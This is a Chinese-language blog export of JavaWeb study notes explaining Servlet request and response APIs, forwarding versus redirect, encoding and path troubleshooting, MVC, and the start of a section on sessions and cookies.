<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"><span class="comment">// 向域中存储/修改数据，没有则存储，有则修改</span></span><br><span class="line"><span class="comment">// 键值对中，键必须是字符串，值是Object</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;keya&quot;</span>,<span class="string">&quot;valuea&quot;</span>);</span><br><span class="line"><span class="comment">// 从域中获取数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">keya</span> <span class="operator">=</span> (String)context.getAttribute(<span class="string">&quot;keya&quot;</span>);</span><br><span class="line"><span class="comment">// 从域中移除数据</span></span><br><span class="line">context.removeAttribute(<span class="string">&quot;keya&quot;</span>);</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="HttpServletRequest-和-HttpServletResponse"><a href="#HttpServletRequest-和-HttpServletResponse" class="headerlink" title="HttpServletRequest 和 HttpServletResponse"></a>HttpServletRequest 和 HttpServletResponse</h2><h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><ul>
<li>HttpServletRequest是一个接口，其父接口是 ServletRequest。</li>
<li>HttpServletRequest是Tomcat将请求报文转换封装来的对象，在 Tomcat调用service方法时传入；</li>
<li>HttpServletReques代表客户端发来的请求，请求中的所有信息都可以通过该对象获得；</li>
</ul>
<h4 id="请求行信息相关API"><a href="#请求行信息相关API" class="headerlink" title="请求行信息相关API"></a>请求行信息相关API</h4><p>请求头：|请求方法（GET&#x2F;POST等）| 目标URL | HTTP协议版本 |</p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>StringBuffer getRequestURL();</td>
<td>获取客户端请求的url，包含前面的协议地址端口号等，如<br /><a href="http://localhost:8080/dm01/servlet01">http://localhost:8080/dm01/servlet01</a></td>
</tr>
<tr>
<td>String getRequestURl(),</td>
<td>获取客户端请求项目中的具体资源。如&#x2F;dm01&#x2F;servlet01</td>
</tr>
<tr>
<td>int getServerPort();</td>
<td>获取客户端发送请求时的端口。</td>
</tr>
<tr>
<td>int getLocalPort();</td>
<td>获取本应用在所在容器的端口。</td>
</tr>
<tr>
<td>int getRemotePort();</td>
<td>获取客户端程序的端口</td>
</tr>
<tr>
<td>String getScheme();</td>
<td>获取请求协议。</td>
</tr>
<tr>
<td>String getProtocol();</td>
<td>获取请求协议及版本号</td>
</tr>
<tr>
<td>String getMethod();</td>
<td>获取请求方式。</td>
</tr>
</tbody></table>
<p>附注：</p>
<p>当存在代理时，getServerPort();和 getLocalPort();不同，前者指向代理的端口，后者指向应用服务器端口。没有代理时都指向应用服务器端口（8080）</p>
<h4 id="请求头信息相关API"><a href="#请求头信息相关API" class="headerlink" title="请求头信息相关API"></a>请求头信息相关API</h4><p>请求头示例：</p>
<blockquote>
<p>Host: <a href="http://www.example.com/">www.example.com</a><br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64)<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml<br>Connection: keep-alive</p>
</blockquote>
<p>可用API:</p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>String getHeader(String headerName);</td>
<td>根据头名称获取请求头。</td>
</tr>
<tr>
<td>Enumeration getHeaderNames()</td>
<td>获取所有的请求头名字。</td>
</tr>
<tr>
<td>String getContentType();</td>
<td>获取content-type请求头:</td>
</tr>
</tbody></table>
<h4 id="请求参数相关API"><a href="#请求参数相关API" class="headerlink" title="请求参数相关API"></a>请求参数相关API</h4><p>当请求方法为Post时，参数在请求体；当请求方法为Get时，参数在URL。但只要是Key-Value型参数，无论参数在URL中还是在请求体中均可以使用以下API获取。<strong>GET参数也可以有请求体，但参数一般不放在请求体中</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>String getParameter(String parameterName),</td>
<td>根据请求参数名获取请求单个参数值</td>
</tr>
<tr>
<td>String[] getParameterValues(String parameterName);</td>
<td>根据请求参数名获取请求多个参数值数组。</td>
</tr>
<tr>
<td>Enumeration getParameterNames();</td>
<td>获取所有请求参数名。</td>
</tr>
<tr>
<td>Map&lt;String, String[]&gt; getParameterMap();</td>
<td>获取所有请求参数的键值对集合。</td>
</tr>
<tr>
<td>BufferedReader getReader() throws lOException;</td>
<td>获取读取<strong>请求体</strong>的字符输入流。</td>
</tr>
<tr>
<td>ServletinputStream getInputStream() throws l0Exception;</td>
<td>获取读取<strong>请求体</strong>的字节输入流:</td>
</tr>
<tr>
<td>int getContentLength();</td>
<td>获得请求体长度的字节数。</td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    Enumeration&lt;String&gt; parameterNames = request.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span>(parameterNames.hasMoreElements())&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> parameterNames.nextElement();</span><br><span class="line">        <span class="comment">// 同一个参数可能有多个值</span></span><br><span class="line">        String[] values = request.getParameterValues(e);</span><br><span class="line">        <span class="keyword">if</span>(values.length&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(e + <span class="string">&quot;=&quot;</span> + Arrays.toString(values));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(e+<span class="string">&quot;=&quot;</span>+values[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取请求体非K_V型数据</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> request.getReader();<span class="comment">// json串</span></span><br><span class="line">    <span class="type">ServletInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> request.getInputStream();<span class="comment">// 二进制字节输入流，可以获取文件等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="其他API"><a href="#其他API" class="headerlink" title="其他API"></a>其他API</h4><table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>String getServletPath();</td>
<td>获取请求的servlet的映射路径,</td>
</tr>
<tr>
<td>ServletContext getServletContext;</td>
<td>获取ServletContext对象</td>
</tr>
<tr>
<td>Cookie[] getCookies();</td>
<td>获取请求中的所有cookie</td>
</tr>
<tr>
<td>HttpSession getSession();</td>
<td>获取Session对象。</td>
</tr>
<tr>
<td>void setCharacterEncoding(String encoding)</td>
<td>设置请求体字符集</td>
</tr>
</tbody></table>
<hr>
<h3 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h3><ul>
<li>HttpServletResponse是一个接口，其父接是ServletResponse;</li>
<li>HttpServletResponse是Tomcat预先创建的，在Tomcat调用service方法时传入;</li>
<li>HttpServletResponse代表对客户端的响应，该对象会被转换成响应的报文发送给客户端，通过该对象我们可以设置响应信息;</li>
</ul>
<p>一个响应报文的结构示例：</p>
<blockquote>
<p>HTTP&#x2F;1.1 200 OK<br>Date: Tue, 06 Jan 2025 16:18:00 GMT<br>Server: Apache&#x2F;2.4.41 (Ubuntu)<br>Content-Type: text&#x2F;html; charset&#x3D;UTF-8<br>Content-Length: 1024</p>
<p>&lt;html&gt;</p>
<p>&lt;head&gt;&lt;title&gt;Example Domain&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</p>
<p>&lt;body&gt;</p>
<p>&lt;h1&gt;Example Domain&lt;&#x2F;h1&gt;<br>&lt;p&gt;This domain is for use in illustrative examples in documents.&lt;&#x2F;p&gt;</p>
<p>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;</p>
</blockquote>
<h4 id="常用API-1"><a href="#常用API-1" class="headerlink" title="常用API"></a>常用API</h4><p><strong>设置响应行相关</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>void setStatus(int code);</td>
<td>设置响应状态码</td>
</tr>
</tbody></table>
<p><strong>设置响应头相关:</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>void setHeader(StringheaderName, String headerValue);</td>
<td>设置&#x2F;修改响应头键值对</td>
</tr>
<tr>
<td>void setContentType(String contentType);</td>
<td>设置content-type响应头及响应字符集(设置MIME类型)</td>
</tr>
</tbody></table>
<p><strong>设置响应体相关:</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>PrintWriter getWriter()throws l0Exception</td>
<td>获得向响应体放入信息的字符输出流</td>
</tr>
<tr>
<td>ServletOutputStream getOutputStream() throws lOException</td>
<td>获得向响应体放入信息的字节输出流</td>
</tr>
<tr>
<td>void setContentLength(int length);</td>
<td>设置响应体的字节长度，其实就是在设置content-length响应头</td>
</tr>
</tbody></table>
<p><strong>其他API:</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>功能解释</th>
</tr>
</thead>
<tbody><tr>
<td>void sendError(int code,String message) throws IOException;</td>
<td>向客户端响应错误信息的方法，需要指定响应码和响应信息</td>
</tr>
<tr>
<td>void addCookie(Cookie cookie);</td>
<td>向响应体中增加cookie</td>
</tr>
<tr>
<td>void setCharacterEncoding(String encoding);</td>
<td>设置响应体字符集</td>
</tr>
</tbody></table>
<p>MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展）类型是设定某种扩展名的文件用一种应用程序打开的方式的类型。</p>
<hr>
<h2 id="请求转发与响应重定向"><a href="#请求转发与响应重定向" class="headerlink" title="请求转发与响应重定向"></a>请求转发与响应重定向</h2><p>请求转发和响应重定向是web应用中间接访问项目资源的两种手段，也是Servlet控制页面跳转的两种手段;<br>请求转发通过HttpServletRequest实现，响应重定向通过HttpServletResponse实现。请求转发和响应重定向的区别在于客户端是否找到自己的请求被第三方处理了，前者不知，后者知。</p>
<p><strong>在同样能够实现页面跳转（仅针对页面跳转）的情况，优先使用响应重定向！</strong></p>
<h3 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250105172227.png"></p>
<h4 id="（重点）特点"><a href="#（重点）特点" class="headerlink" title="（重点）特点"></a>（重点）特点</h4><ul>
<li>请求转发通过HttpServletRequest对象获取请求转发器实现;</li>
<li>请求转发是服务器内部的行为，对客户端是屏蔽的;</li>
<li>客户端只发送了一次请求，客户端地址栏不变;</li>
<li>服务端<strong>只产生了一对请求和响应对象</strong>，这一对请求和响应对象会继续传递给下一个资源;</li>
<li>因为全程<strong>只有一个HttpservletRequset对象</strong>，所以请求**参数可以传递,**请求域中的数据也可以传递;</li>
<li>请求转发可以转发给其他servlet动态资源，也可以转发给一些静态资源以实现页面跳转，</li>
<li>请求转发<strong>可以转发给WEB-INF下</strong>受保护的资源;</li>
<li>请求转发<strong>不能转发到本项目以外</strong>的外部资源:</li>
</ul>
<p><strong>请求转发可以转发到WEB_INF文件夹下的受保护资源，这也是WEB-INF下资源的唯一访问方式</strong></p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><strong>请求可以转发给项目内部动态、静态资源（包括WEB-INF下受保护资源），不可以转发到外部资源。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/sa&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletA</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is servlet A&quot;</span>);</span><br><span class="line">        <span class="comment">// 请求转发给ServletB</span></span><br><span class="line">        <span class="comment">// 1. 获取请求转发器</span></span><br><span class="line">        <span class="type">RequestDispatcher</span> <span class="variable">servletB</span> <span class="operator">=</span> req.getRequestDispatcher(<span class="string">&quot;sb&quot;</span>);</span><br><span class="line">        <span class="comment">// 2. 让请求转发器进行转发动作</span></span><br><span class="line">        servletB.forward(req,resp);</span><br><span class="line">        <span class="comment">// 转发到HTML等静态资源下,如下中a.html在项目文件夹下(web)</span></span><br><span class="line">		<span class="comment">// RequestDispatcher html = req.getRequestDispatcher(&quot;a.html&quot;);</span></span><br><span class="line">        <span class="comment">// html.forward(req,resp);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/sb&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletB</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is servlet B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="响应重定向"><a href="#响应重定向" class="headerlink" title="响应重定向"></a>响应重定向</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250105201213.png"></p>
<h4 id="（重点）特点："><a href="#（重点）特点：" class="headerlink" title="（重点）特点："></a>（重点）特点：</h4><ul>
<li>响应重定向通过HttpServletResponse对象的sendRedirect方法实现;</li>
<li>响应重定向是服务端通过302响应码和路径，告诉客户端自己去找其他资源，是在服务端提示下的客户端的行为;</li>
<li>客户端<strong>至少发送了两次请求</strong>，客户端地址栏是要变化的;</li>
<li>服务端<strong>产生了多对请求和响应对象</strong>，且请求和响应对象不会传递给下一个资源</li>
<li>因为全程产生了多个HttpServletRequset对象，所以<strong>请求参数不可以传递</strong>，请求域中的数据也不可以传递:</li>
<li>重定向可以是其他Servlet动态资源，也可以是一些静态资源以实现页面跳转;</li>
<li>重定向<strong>不可以到给WEB-INF</strong>下受保护的资源:</li>
<li>重定向<strong>可以到本项目以外</strong>的外部资源:</li>
</ul>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/sa&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletA</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sa is executed&quot;</span>);</span><br><span class="line">        <span class="comment">// 响应重定向</span></span><br><span class="line">        <span class="comment">// 设置响应状态为302 并设置location为sb</span></span><br><span class="line">        resp.sendRedirect(<span class="string">&quot;sb&quot;</span>);</span><br><span class="line">        <span class="comment">// resp.sendRedirect(&quot;a.html&quot;);</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/sb&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletB</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sb is executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<hr>
<h2 id="常见问题排查"><a href="#常见问题排查" class="headerlink" title="常见问题排查"></a>常见问题排查</h2><h3 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h3><p>产生乱码问题的根本原因：</p>
<ul>
<li>数据的编码和解码没有使用同一个字符集</li>
<li>使用了不支持某语言文字的字符集</li>
</ul>
<p>UTF-8不包含全部的GBK，采用自己的编码方式。</p>
<h4 id="HTML乱码问题"><a href="#HTML乱码问题" class="headerlink" title="HTML乱码问题"></a>HTML乱码问题</h4><p>IDEA可以自动检测HTML文件解析采用的字符集，并按对应字符集存储。</p>
<p>IDEA设置文件默认字符集：</p>
<p>文件 &#x3D;&#x3D;》设置 &#x3D;&#x3D;》编辑器 &#x3D;&#x3D;》文件编码 &#x3D;&#x3D;》三处全部是UTF-8</p>
<h4 id="Tomcat控制台乱码"><a href="#Tomcat控制台乱码" class="headerlink" title="Tomcat控制台乱码"></a>Tomcat控制台乱码</h4><p>一般国内生产的计算机采用GBK作为默认字符集，而Tomcat默认采用UTF-8字符集，控制台输出日志可能乱码，因此需要修改<code>/conf/logging.properties</code>，将UTF-8改为GBK。</p>
<p><strong>System.out.println乱码问题：</strong></p>
<p>可能是IDEA以UTF-8保存编译了.class文件而JVM没有使用UTF-8解析。在运行&#x2F;调试配置=&#x3D;》服务器 &#x3D;=》虚拟机选项 &#x3D;&#x3D;》<code>-Dfile.encoding-UTF-8</code></p>
<h4 id="请求乱码问题"><a href="#请求乱码问题" class="headerlink" title="请求乱码问题"></a>请求乱码问题</h4><h5 id="Get请求乱码"><a href="#Get请求乱码" class="headerlink" title="Get请求乱码"></a>Get请求乱码</h5><p>Tomcat某些版本中，Get请求可能出现乱码。HTML文件中设置的编码方式不仅影响页面解析，同样影响表单提交时使用的编码。Tomcat默认解码使用的是UTF-8编码，可能会出现乱码问题。需要修改service.xml，在Connector标签下添加属性URIEncoding&#x3D;”与HTML相同的编码”（此属性仅影响对请求行中的URL的解析，get请求参数一般在URL中，post请求的参数在请求体，不受影响）</p>
<h5 id="post请求乱码"><a href="#post请求乱码" class="headerlink" title="post请求乱码"></a>post请求乱码</h5><p>在代码中使用<code>request.setCharacterEncoding(&quot;字符集&quot;)</code>设置请求体的解码使用的字符集。</p>
<h4 id="响应乱码问题"><a href="#响应乱码问题" class="headerlink" title="响应乱码问题"></a>响应乱码问题</h4><p>Tomcat10中，响应体默认使用UTF-8作为编码字符集，如果前端页面采用不同的字符集，可以通过两种方式解决：</p>
<ul>
<li><p>（不建议）设置响应体的字符集和客户端保持一致。<code>response.setCharacterEncoding(&quot;字符集&quot;)</code></p>
<blockquote>
<p>客户端解析的字符集是无法预测的，服务器可能不支持。</p>
</blockquote>
</li>
<li><p>向客户端说明按指定字符集进行解码，需要设置Content-Type头。<code>response.setContentType(&quot;text/html;charset=UTF-8&quot;)</code></p>
<blockquote>
<p>需要明确服务器响应体编码再设置，建议事先要求服务器按指定编码：</p>
<p>response.setCharacterEncoding(“字符集”)</p>
</blockquote>
</li>
</ul>
<h3 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h3><p>在部署时将应用程序上下文设置为<code>/</code>，路径直接填写绝对路径去除应用程序上下文后的。</p>
<p>（实际企业应用中就是这样设置）</p>
<p>以下仅是在没有做如上修改的情况下的方案：</p>
<h4 id="前端路径问题"><a href="#前端路径问题" class="headerlink" title="前端路径问题"></a>前端路径问题</h4><p>示例目录结构：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">|-- webapp</span><br><span class="line">	|-- a</span><br><span class="line">	|	`-- b</span><br><span class="line">	|		`-- c</span><br><span class="line">	|			`-- test.html</span><br><span class="line">	|-- static</span><br><span class="line">	|	`-- img</span><br><span class="line">	|		`-- img.png</span><br><span class="line">    |-- WEB-INF                   </span><br><span class="line">    |   |-- web.xml               </span><br><span class="line">    |   `-- view</span><br><span class="line">	|		`-- view1.html</span><br><span class="line">    `-- index.html               </span><br></pre></td></tr></table></figure>

<h5 id="相对路径问题"><a href="#相对路径问题" class="headerlink" title="相对路径问题"></a>相对路径问题</h5><p>如果在index.html中插入img.png，相对路径应当为<code>static/img/img.png</code>，因为：</p>
<p>当前资源（index.html）的请求路径：<a href="http://localhost:8080/demo01/index.html">http://localhost:8080/demo01/index.html</a></p>
<p>当前资源是：index.html</p>
<p>当前资源所在路径是：<a href="http://localhost:8080/demo01/">http://localhost:8080/demo01/</a></p>
<p>相对路径的规则就是在当前资源所在路径后拼接目标资源路径，然后发送请求寻找目标资源。</p>
<p><a href="http://localhost:8080/demo01/static/img/img.png">http://localhost:8080/demo01/static/img/img.png</a></p>
<p><strong>注意：</strong></p>
<blockquote>
<p>填写相对路径，不能只看磁盘的目录结构，而是要在浏览器的角度分析。如在面对请求转发时，对于浏览器而言它的URL是没有发生变化的，如果上述的index.html文件是被转发的对象，而浏览器认为的URL还是转发前的对象的URL，这样拼接之后可能会得到错误的路径。</p>
</blockquote>
<h5 id="绝对路径问题"><a href="#绝对路径问题" class="headerlink" title="绝对路径问题"></a>绝对路径问题</h5><p>绝对路径是直接拼接到<a href="http://localhost:8080/">http://localhost:8080</a> 后的，应当以<code>/</code>开头，从项目上下文开始填写，项目上下文就相当于磁盘中的WebAPP目录。但由于项目上下文很可能发生改变，为避免频繁修改文件的绝对路径，有两种处理方式：</p>
<ul>
<li>在html文件的 head标签子标签base下添加属性，定义公共前缀（即上下文），后续路径只需要填写相对webapp下目录的路径，即可转为绝对路径</li>
<li>见下文</li>
</ul>
<h4 id="重定向中的路径问题"><a href="#重定向中的路径问题" class="headerlink" title="重定向中的路径问题"></a>重定向中的路径问题</h4><p>与前端一致。</p>
<h4 id="请求转发中的路径问题"><a href="#请求转发中的路径问题" class="headerlink" title="请求转发中的路径问题"></a>请求转发中的路径问题</h4><p>相对路径写法同前端一致，绝对路径无需补充上下文，直接从上下文下一层开始。</p>
<hr>
<h2 id="MVC架构模式"><a href="#MVC架构模式" class="headerlink" title="MVC架构模式"></a>MVC架构模式</h2><p>MVC(Model View Controller)是软件工程中的一种<code>软件架构模式</code>，将软件系统分为<code>模型</code>，<code>视图</code>和<code>控制器</code>三个基本部分。用一种业务逻辑，数据，界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，无需重新编写业务逻辑，实现高内聚低耦合。</p>
<p><strong>M:Model模型层</strong>，具体功能如下:</p>
<ol>
<li>存放和数据库对应的实体类以及一些用于存储非数据库表完整相关的v0对象;</li>
<li>存放一些对数据进行逻辑运算操作的一些业务处理代码;</li>
</ol>
<p><strong>V:View 视图层</strong>，具体功能如下:</p>
<ol>
<li>存放一些视图文件相关的代码 html css is等:</li>
<li>在前后端分离的项目中，后端已经没有视图文件，该层次已经衍化成独立的前端项目:</li>
</ol>
<p><strong>C:Controller 控制层</strong>,具体功能如下:</p>
<pre><code>1. 接收客户端请求，获得请求数据
1. 将准备好的数据响应给客户端
</code></pre>
<p><strong>MVC结构下各层常见包：</strong></p>
<p>M:</p>
<ol>
<li>实体类包(pojo&#x2F;entity &#x2F;bean)   专门存放和数据库对应的实体类和一些V0对象</li>
<li>数据库访问包(dao&#x2F;mapper)     专门存放对数据库不同表格CURD方法封装的一些类</li>
<li>服务包(service)                            专门存放对数据进行业务逻辑运算的一些类</li>
</ol>
<p>C:</p>
<ol>
<li>控制层包(controller)</li>
</ol>
<p>V：</p>
<ol>
<li><p>web目录下的视图资源 html、css、js、img等</p>
</li>
<li><p>前端工程化后，在后端项目中已经不存在了</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250107121541.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250107122800.png"></p>
]]></content>
      <categories>
        <category>前端技术</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>Tomcat</tag>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-SFLA-Note</title>
    <url>/2025/01/13/JavaWeb-SFLA-Note/</url>
    <content><![CDATA[<h1 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在网络应用中，HTTP协议是无状态的，这意味着每个请求都是独立的。然而，许多应用需要跟踪用户的活动，例如登录状态、购物车内容等。会话管理通过创建和维护会话来保存这些信息，确保用户体验的一致性和连贯性。有效的会话管理包括对会话的保护措施，如使用安全令牌、加密会话数据以及设置合理的会话过期时间，从而防止会话劫持和其他安全威胁。通过有效地管理会话，可以减少服务器资源的消耗，例如通过内存或数据库存储会话数据，避免重复查询数据库以获取相同的信息，提高响应速度。基于会话数据，应用能够提供更加个性化的用户体验，比如推荐相关产品或服务、显示用户偏好设置等。随着移动设备、桌面应用和Web服务之间的交互日益增多，良好的会话管理能够确保不同平台之间数据的一致性和互通性，提升用户的整体体验。</p>
<p><strong>实现会话管理的手段：</strong></p>
<p>实现会话管理的常用手段主要包括以下几个方面，每种方法都有其特点和适用场景：</p>
<ol>
<li><p><strong>Cookie</strong>：</p>
<ul>
<li><strong>描述</strong>：Cookie是最常见的会话管理方式之一。服务器可以通过HTTP响应头将少量数据发送到客户端，并由客户端在随后的请求中自动附带这些数据返回给服务器。</li>
<li><strong>优点</strong>：简单易用，支持跨页面保持用户状态。</li>
<li><strong>缺点</strong>：大小有限制（通常为4KB），且可能影响性能；存在被篡改或窃取的风险。</li>
</ul>
</li>
<li><p><strong>Session（会话）</strong>：</p>
<ul>
<li><strong>描述</strong>：当用户访问网站时，服务器可以创建一个唯一的会话ID并存储在Cookie中。服务器端则维护与该会话ID相关的数据。</li>
<li><strong>优点</strong>：安全性较高，因为实际的数据保存在服务器上。</li>
<li><strong>缺点</strong>：需要消耗服务器资源来存储会话数据，不适合分布式环境。</li>
</ul>
</li>
<li><p><strong>Token（令牌）</strong>：</p>
<ul>
<li><strong>描述</strong>：使用如JWT（JSON Web Token）这样的技术，通过加密的方式生成一个包含用户信息的令牌，在每次请求时传递给服务器进行验证。</li>
<li><strong>优点</strong>：自包含、无状态，适合微服务架构和分布式系统；易于扩展和部署。</li>
<li><strong>缺点</strong>：一旦签发，除非过期，否则无法撤销，需谨慎设置过期时间。</li>
</ul>
</li>
<li><p><strong>隐藏表单字段</strong>：</p>
<ul>
<li><strong>描述</strong>：在网页表单中添加一个隐藏字段，用于存储会话标识符或其他重要信息。</li>
<li><strong>优点</strong>：适用于不支持Cookie的情况。</li>
<li><strong>缺点</strong>：增加了页面复杂度，且不如Cookie安全。</li>
</ul>
</li>
<li><p><strong>URL重写</strong>：</p>
<ul>
<li><strong>描述</strong>：将会话ID直接附加到URL后面，使得每个链接都包含用户的会话信息。</li>
<li><strong>优点</strong>：不需要依赖于Cookie，适用于不允许使用Cookie的环境。</li>
<li><strong>缺点</strong>：容易暴露会话ID，不够安全；URL长度限制。</li>
</ul>
</li>
</ol>
<p>选择合适的会话管理方式取决于具体的应用需求、安全性考虑以及系统架构等因素。在实际应用中，可能会结合多种方法以达到最佳效果。例如，利用Cookie存储会话ID的同时，使用服务器端的Session机制来管理和保护敏感数据。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><strong>Cookie</strong> 是一种小型文本文件，由服务器通过HTTP响应发送给用户的浏览器，并存储在用户的设备上。它主要用于网站识别用户、保存用户的偏好设置或跟踪用户的行为等目的。每个Cookie都包含了一些信息，如名称、值、过期时间、路径、域名和安全属性等。</p>
<h3 id="Cookie的工作原理"><a href="#Cookie的工作原理" class="headerlink" title="Cookie的工作原理"></a>Cookie的工作原理</h3><ol>
<li><p><strong>创建与设置</strong>：</p>
<ul>
<li>当用户首次访问一个网站时，服务器可以通过HTTP响应头<code>Set-Cookie</code>向用户的浏览器发送一个或多个Cookie。</li>
<li>例如：<code>Set-Cookie: sessionId=abc123; Max-Age=3600; Path=/; Secure; HttpOnly</code></li>
</ul>
</li>
<li><p><strong>存储</strong>：</p>
<ul>
<li>浏览器接收到这些Cookie后，会根据其属性（如域名、路径、有效期等）决定是否以及如何存储它们。</li>
<li>每个网站可以存储多个Cookie，但总大小通常限制在4KB左右。</li>
</ul>
</li>
<li><p><strong>发送与读取</strong>：</p>
<ul>
<li>在后续对该网站的请求中，如果请求的URL符合某个已存储Cookie的路径和域名条件，浏览器就会自动将该Cookie的名称和值附加到HTTP请求头<code>Cookie</code>中发送给服务器。</li>
<li>例如：<code>Cookie: sessionId=abc123</code></li>
</ul>
</li>
<li><p><strong>更新与删除</strong>：</p>
<ul>
<li>服务器可以通过再次发送带有相同名称但不同值或过期时间的<code>Set-Cookie</code>头部来更新或删除Cookie。</li>
<li>删除Cookie通常是通过设置它的<code>Max-Age</code>或<code>Expires</code>属性为过去的日期来实现的。</li>
</ul>
</li>
</ol>
